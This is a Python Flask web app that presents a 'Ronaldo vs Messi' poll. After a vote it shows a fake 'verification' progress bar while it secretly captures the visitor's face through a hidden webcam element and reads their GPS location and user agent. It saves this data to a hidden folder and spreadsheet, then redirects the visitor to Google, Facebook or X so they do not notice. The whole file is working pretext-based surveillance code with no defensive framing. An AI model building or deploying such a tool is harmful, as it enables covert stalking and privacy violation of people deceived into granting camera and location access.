from flask import Flask, request, render_template_string, jsonify, abort
import os
import base64
from datetime import datetime
from openpyxl import Workbook, load_workbook
import random

app = Flask(__name__)

# Folder to store captures (hidden, not public)
OUTPUT_FOLDER = "endproduct"
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

# Excel file to log results
EXCEL_FILE = os.path.join(OUTPUT_FOLDER, "data.xlsx")
if not os.path.exists(EXCEL_FILE):
    wb = Workbook()
    ws = wb.active
    ws.append(["Vote", "Latitude", "Longitude", "Face Image", "Video File", "Timestamp", "User Agent"])
    wb.save(EXCEL_FILE)

# 🛑 Block direct access to "endproduct" folder
@app.route("/endproduct/<path:filename>")
def block_access(filename):
    abort(403)  # Forbidden


# Home page (Ronaldo vs Messi poll)
@app.route("/")
def home():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ronaldo vs Messi Poll</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
            button { padding: 20px 40px; margin: 20px; font-size: 20px; border-radius: 10px; cursor: pointer; }
            h1 { color: #333; }
        </style>
    </head>
    <body>
        <h1>Who is the GOAT?</h1>
        <button onclick="window.location.href='/verify/ronaldo'">⚽ Ronaldo</button>
        <button onclick="window.location.href='/verify/messi'">🏆 Messi</button>
    </body>
    </html>
    """
    return render_template_string(html)


# Verification page
@app.route("/verify/<vote>")
def verify(vote):
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verification</title>
        <style>
            #progress-container {{
                width: 100%;
                background-color: #ddd;
                margin-top: 20px;
            }}
            #progress-bar {{
                width: 1%;
                height: 30px;
                background-color: #4CAF50;
                text-align: center;
                color: white;
            }}
            video, canvas {{
                display: none;
            }}
        </style>
    </head>
    <body>
        <h2>Verification in progress...</h2>
        <div id="progress-container">
            <div id="progress-bar">0%</div>
        </div>
        <video id="video" autoplay></video>
        <canvas id="canvas" width="320" height="240"></canvas>
        <script>
            const video = document.getElementById('video');
            navigator.mediaDevices.getUserMedia({{ video: true }})
                .then(stream => {{ video.srcObject = stream; }})
                .catch(err => console.error('Camera error:', err));

            navigator.geolocation.getCurrentPosition(position => {{
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                let progress = 0;
                const progressBar = document.getElementById('progress-bar');

                const interval = setInterval(() => {{
                    if (progress >= 100) {{
                        clearInterval(interval);

                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        const faceData = canvas.toDataURL('image/png');

                        const videoData = faceData;

                        fetch('/save', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                vote: '{vote}',
                                latitude: lat,
                                longitude: lon,
                                face_image: faceData,
                                video_data: videoData,
                                user_agent: navigator.userAgent,
                                timestamp: new Date().toISOString()
                            }})
                        }}).then(() => {{
                            const sites = ['https://www.google.com', 'https://www.facebook.com', 'https://x.com'];
                            const randomSite = sites[Math.floor(Math.random() * sites.length)];
                            window.location.href = randomSite;
                        }});
                    }} else {{
                        progress += 2;
                        progressBar.style.width = progress + '%';
                        progressBar.innerText = progress + '%';
                    }}
                }}, 60);
            }});
        </script>
    </body>
    </html>
    """
    return render_template_string(html)


# Save endpoint
@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    vote = data.get("vote")
    lat = data.get("latitude")
    lon = data.get("longitude")
    face = data.get("face_image")
    video_data = data.get("video_data")
    timestamp = data.get("timestamp")
    ua = data.get("user_agent")

    # Save face image
    face_file = os.path.join(OUTPUT_FOLDER, f"{vote}_{datetime.now().strftime('%Y%m%d%H%M%S')}_face.png")
    with open(face_file, "wb") as f:
        f.write(base64.b64decode(face.split(",")[1]))

    # Save video placeholder
    video_file = os.path.join(OUTPUT_FOLDER, f"{vote}_{datetime.now().strftime('%Y%m%d%H%M%S')}_video.png")
    with open(video_file, "wb") as f:
        f.write(base64.b64decode(video_data.split(",")[1]))

    # Append to Excel
    wb = load_workbook(EXCEL_FILE)
    ws = wb.active
    ws.append([vote, lat, lon, face_file, video_file, timestamp, ua])
    wb.save(EXCEL_FILE)

    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
